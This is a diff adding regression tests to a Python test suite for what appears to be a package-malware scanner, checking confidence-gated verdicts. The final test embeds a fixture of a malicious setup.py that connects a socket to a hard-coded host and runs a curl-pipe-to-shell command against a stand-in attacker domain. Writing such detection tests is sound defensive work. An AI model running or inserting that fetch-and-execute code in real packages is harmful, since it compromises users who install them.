@@ -1173,6 +1173,7 @@ def test_dense_hex_escapes_ignores_short_binary_signature_checks():
     assert not any(f.startswith("SUSPICIOUS_OBFUSCATION") for f in report.flags)
 
 
+
 def test_layered_decode_ignores_plain_base64_text_decoding():
     """
     Regression for a real false positive: `c7n-azure` and `spotapi` (both
@@ -1194,3 +1195,56 @@ def test_layered_decode_ignores_plain_base64_text_decoding():
     })
     report = analyze_python_package_tarball(tarball, "pkg")
     assert not any(f.startswith("SUSPICIOUS_OBFUSCATION") for f in report.flags)
+
+
+
+def test_many_low_confidence_signals_yield_unverified_not_suspicious():
+    """
+    Regression for the false positives this whole confidence framework was
+    built for (`playwright`, `node-sass`, `esbuild`, `husky`, `sharp`): a
+    package that touches several individually-ubiquitous, LOW-confidence
+    primitives (network call, env access, base64 decode, dynamic exec — each
+    of which real complex JS tools use for entirely legitimate reasons)
+    should not stack past SUSPICIOUS/MALICIOUS just from volume. It should
+    land on UNVERIFIED_HIGH_SIGNAL: real signal, not confidently confirmed.
+    Uses npm because these four LOW-confidence categories can co-occur and
+    cross the point threshold there the same way the real cases did; the
+    Python side flat-scores by prefix category (a separate, pre-existing
+    granularity gap, not this gate's concern) and a single-file synthetic
+    fixture can't independently cross 35 across enough distinct categories.
+    """
+    from slopwatch.assessor.npm_source import analyze_npm_package_tarball as npm_analyze
+    # Spread across separate files, like the real cases (playwright's eval
+    # lived in esmLoader.js, its subprocess/base64 use in runner/index.js) —
+    # crammed into one function these would trip the composite proximity
+    # heuristic (eval near decode/network), which is deliberately
+    # HIGH-confidence and correctly NOT what this test is about.
+    tarball = _make_tarball({
+        "package/package.json": '{"name": "pkg", "version": "1.0.0"}',
+        "package/lib/transform.js": "function t(expr) { return eval(expr); }\n",
+        "package/lib/config.js": "const port = process.env.PORT || 3000;\n",
+        "package/lib/telemetry.js": "const axios = require('axios');\nfunction ping() { axios.get('https://example.com/telemetry'); }\n",
+        "package/lib/util.js": "function decode(s) { return atob(s); }\n",
+    })
+    report = npm_analyze(tarball, "pkg")
+    assert report.verdict == ThreatVerdict.UNVERIFIED_HIGH_SIGNAL
+
+
+def test_single_high_confidence_signal_still_wins_outright():
+    """A genuinely HIGH-confidence signal must never be demoted by the gate,
+    no matter how few other signals accompany it — that's what HIGH means.
+    Reuses the existing top-level reverse-shell fixture (already asserted
+    MALICIOUS elsewhere) purely to confirm the confidence gate doesn't
+    interfere with it."""
+    malicious_code = """
+import socket, subprocess, os
+from setuptools import setup
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("10.0.0.1", 4242))
+os.system("curl -s http://attacker.com/payload | sh")
+
+setup(name="fastapi-azure-b2c", version="0.1.0")
+"""
+    report = inspect_python_code_ast(malicious_code, "setup.py")
+    assert report.verdict == ThreatVerdict.MALICIOUS
